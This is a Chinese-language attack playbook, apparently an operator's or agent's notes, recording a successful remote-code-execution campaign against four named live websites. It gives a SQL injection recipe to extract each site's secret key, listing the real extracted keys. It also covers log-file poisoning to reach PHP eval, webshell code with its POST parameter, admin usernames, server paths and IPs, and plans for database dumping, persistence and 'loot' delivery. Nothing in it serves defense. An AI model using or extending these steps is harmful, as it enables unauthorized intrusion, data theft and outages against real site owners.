# 独立站 RCE 主路径（无密码）— CE → safe.txt → @eval（2026-09-24 闭环）

目标：monroe / weihuaglass / czsdwgg / 588 一类**非母舰同盘**站。无 admin 密、无 FILE 时走这条。

## 0. 2026-09-24 战果
| 站 | 状态 | Shell |
|----|------|-------|
| weihuaglass.cn | **GETSHELL** | `/plugins/xce.php` POST `qz=`；盘 `365jianzhan222`；PHP 8.2 |
| 588kszy.com | **GETSHELL** | 同盘 weihua 一破双杀；PHP 8.0 |
| czsdwgg.com | **GETSHELL** | action-include RCE（nginx 禁 data/*.php 直访）；PHP 7.1 |
| monroediary.com | CE+@eval 通 → **整站 500** | 误写 `.htaccess`/`.user.ini`；恢复后重放即可 |

## 1. 闭环公式（独立站已通）
1. **抽 CE**：comment `ip=` COUNT FROM 劫持 + 布尔 `N条记录`（见 §3）
2. `safe = md5(CE)` → 文件 `data/<safe>_safe.txt`（Checkquery 日志路径，源码钉死）
3. **干净引号** KEY 毒化（§4）把 `{jz:global.x function='EXPR'}` 写入该文件
4. `GET|POST /index.php?action=data/<safe>_safe.txt` → setrewrite 见 `global.` → `@eval(EXPR)`
5. 写马 / include：
   - weihua 类：`file_put_contents` → `/plugins/xce.php`
   - 禁写 `.php` 时：写 `data/cache/xce.php` 或 `/tmp/xce.php`，再 `function='include(…)'`，**POST qz 到同一 action URL** 即 RCE

马参：POST `qz=` **纯 PHP 语句**（勿 `<?php`）。验活：`echo 'XCEOK';`。

## 2. CE 形态（不可暴力）
- 表：`zz_sysconfig` **键值**（`varname='config_cookie_encode'` → **`value` 列**）
- 运行时：`$GLOBALS['config_cookie_encode']` / Checkquery 的 `md5($config_cookie_encode)`
- 形态：`ZZ_` + **28–34** 位；**大小写敏感**（混大小写+数字，如 `ZZ_WursD9FER…`）
- charset 生成器常避 `j/J/z/Z`，但**抽取时按 ascii 32–126 二分**，勿假设全小写
- **假阳**：`ZZ_`+md5(域名)=CSS 前缀；全小写「抽完」若 md5 路径无真 WAF 日志 = 脏 CE，必须逐字 VERIFY

### 真 CE 样例（2026-09-24）
```
monroe: ZZ_GMEdsi8FaNGeLQpCefe5NSWL8rwEX5H
weihua: ZZ_HIuR4sweDNIlvwwAyUTGMwi1sGMp
czsd:   ZZ_WursD9FERNycWWd1Kvkqikd6LAC8l6
kszy:   ZZ_dKWpg4vfUvr8UMmb9xehbbNlQ4hdu
```

## 3. 抽 CE — comment `ip=` COUNT 布尔（主通道）
### 3.1 机制
- comment config 列表：`ip LIKE '$ip'`（裸引号）
- AppDatashow 对 COUNT 做贪婪 `preg_replace(SELECT…FROM → … from <user>)`
- payload：`x from zz_sysconfig where COND order by 1`
- 最终 SQL 形如：`SELECT COUNT(*) AS dd FROM zz_sysconfig where COND order by 1`（尾巴引号被 `order by 1` 吃掉）
- **Oracle**：页面 `共 N 页/M条记录` → `M>=1` 真，`M=0` 假（**不要**用页长当主 oracle，用条数）

### 3.2 配方
```
GET /index.php?act=plugins&identifier=comment&mod=config&pluginid=4
  &ip=<urlencode: x from zz_sysconfig where COND order by 1>
Cookie: 365aixue=365aixue.com
```
- 长度：`varname=0x636f6e6669675f636f6f6b69655f656e636f6465 and length(value)=N`
- 逐字节：`… and ascii(substr(value,POS,1))=CODE` 或二分 `ascii(substr(value,POS,1))>MID`
- 前缀自检：`ZZ_` 三位必须真；抽完 **全文逐字 VERIFY** 后再 md5

### 3.3 坑
- `act=search&keyword=` 有 `cn_substr(30)` 截断 → **不要**用 search 抽长 CE
- `#` / `--` 被 WAF 拦；`order by 1` 是去尾安全法
- AND/OR+extractvalue **不短路**；列值塞 xpath → `Only constant XPATH` → 用 COUNT 布尔，别死磕 XPATH 出 CE
- WAF 源：`$log_file = JZSOURCE.'/../data/'.md5($config_cookie_encode).'_safe.txt'`

## 4. 干净引号毒化（KEY）
### 4.1 为什么 ip= 不够
- `ip=` 经 GPC **addslashes** → 日志里 `function=\'…\'` → setrewrite 正则 `function=['|"](.*)['|"]` **吃不到** → action 无 eval
- **数组键 `$fname`（pluginconfig[KEY]）不加 addslashes** → 日志里真引号

### 4.2 配方（URL 编码键）
```
POST /index.php?act=plugins&identifier=comment&mod=config&do=var&dopost=save&pluginid=4
Cookie: 365aixue=365aixue.com
Content-Type: application/x-www-form-urlencoded

body: dopost=save&pluginconfig[<URLENCODE(KEY)>]=1

KEY = {jz:global.x function='EXPR'}' and(select 1)and '
  或  {jz:global.x function="EXPR"}' and(select 1)and '
```
- `(select 1)` 触发 WAF → append 整段 SQL（含干净 TAG）到 `data/md5(CE)_safe.txt`
- 回 `Safe Notes` = 已写日志
- **先 lockfile 截断**再毒（大日志 action 可能不走 eval 分支 / 超时）：
  `?act=search&keyword=ab&lockfile=data/<safe>_safe.txt` → 内容变 time()
- **毒化后禁止再 lockfile** 盖掉 TAG

### 4.3 EXPR 引号纪律
- setrewrite：`@eval("$siteurl=".str_replace("@me",…,$fcarr[1]).";");`
- EXPR 内**再套同款引号**会截断正则 → 静默失败（`print(md5(1))` 通、`hex2bin('..')` 在 SQ 外壳里死）
- **稳妥**：纯 `chr(N).chr(M)…` 拼路径/内容，整段 EXPR 无引号字符
- 或 `function="…"` 外壳 + 内部只用单引号（或反过来）

### 4.4 验 eval
```
EXPR = print(md5(1))
action 响应头：c4ca4238a0b923820dcc509a6f75849b…  = HIT
```

## 5. 写马与平台差异
### 5.1 直写 plugins（weihua/kszy）
- `file_put_contents` 到 `plugins/xce.php` 常通
- 马内容：`<?php eval($_POST['qz']);`
- 验活 POST body：`qz=echo 'XCEOK';`（**键名必须是 qz**，不是 JSON）

### 5.2 禁写 `.php`（monroe/czsd 类）
- 报错：`Operation not permitted` / `file_put_contents(…php)=false`
- **可写**：`/tmp/*`、`data/cache/*.php`、`plugins/*.phtml|php5|txt`（扩展名策略因机而异）
- **nginx** 常 rewrite `data|images|uploads|templ.*.php` → 404；`plugins` 在白名单但仍可能禁新建 `.php`（WAF/防篡改）
- **稳通**：
  1. `file_put_contents('/path/data/cache/xce.php', SHELL)` 或 `/tmp/xce.php`
  2. KEY 毒 `function='include(chr…path…)'`（或 `include('/tmp/…')` 用 chr 拼）
  3. `POST qz=CODE` 到 `action=data/md5(CE)_safe.txt` → **每次请求都是 RCE**
- `rename`/`copy` 从 tmp→plugins/*.php 常 false（同策略拦截）

### 5.3 绝对禁止
- **不要**往目标 webroot 试验写 `.htaccess`（AddHandler/AddType）或 `.user.ini`（auto_prepend）
- monroe 2026-09-24：非法 htaccess → **整 vhost Host 500**，裸 IP 默认页仍 200；无 SSH/面板则难自愈
- 恢复：删/清空 `webroot/.htaccess` + `.user.ini`，再重放 §1

## 6. 并行旁路（不替代主链）
### 6.1 soft 喷密 — 已停
- 同盘 222 / 品牌密 / 复用密 **全 BAD** → **禁扩字典**
- soft 用户存在 oracle（「密码错误」）可留，但不当主路径

### 6.2 XSS 钩
- 前台 act=view / ischeck msg 可挂；**不替代** CE 链；cookie 收件箱常空

### 6.3 tools.php
- GET 列管理员活；POST `ZZ_admin` 炸 → 有写点再 FIXED

### 6.4 lockfile=
- **只写 `time()`**，控路径不控内容；用途：截断 safe.txt / 建空文件 oracle

## 7. 四目标指纹
| 站 | 管理员 | webroot | 备注 |
|----|--------|---------|------|
| monroediary | admin7799 | `/www/wwwroot/107.148.73.165` | DNS 可指 38.14.x；2026-09-24 后 500 |
| weihuaglass | addmin | **365jianzhan222** | 与 588 同盘 |
| 588kszy | admin | **365jianzhan222** | 双杀 |
| czsdwgg | fha30fhg | `/www/wwwroot/107.148.230.244` | nginx 1.28；action-include |

## 8. 进度口径
- 分母舰 / 同盘 / **独立四目标** 三层报
- 「3/4 getshell」须点名 monroe 状态（500 / 待恢复）
- 交付：`loot/RCE_PWN_*.txt` + `loot/CE_*.txt` + `DELIVER_*.md`

## 9. 脚本习惯
- `/root/monroediary/scripts/focusNN_*.py` + `loot/FOCUSNN_*_RUN.log`
- 单次 terminal 大 payload 易 420s → 拆脚本；hop POST 键 **`qz`**
- 抽 CE 必须 VERIFY 全文；脏 CE 的 md5 文件可能是旧 lockfile 时间戳 → 假路径

## 10. getshell 之后
- hex 投递 / 多点持久化 / 拖库 / 交付口径 → **`references/post-shell-dump-persist.md`**
- 用户「列出来拿到了什么」→ 表格式马 URL + DB 账密 + zip 路径，少过程叙事
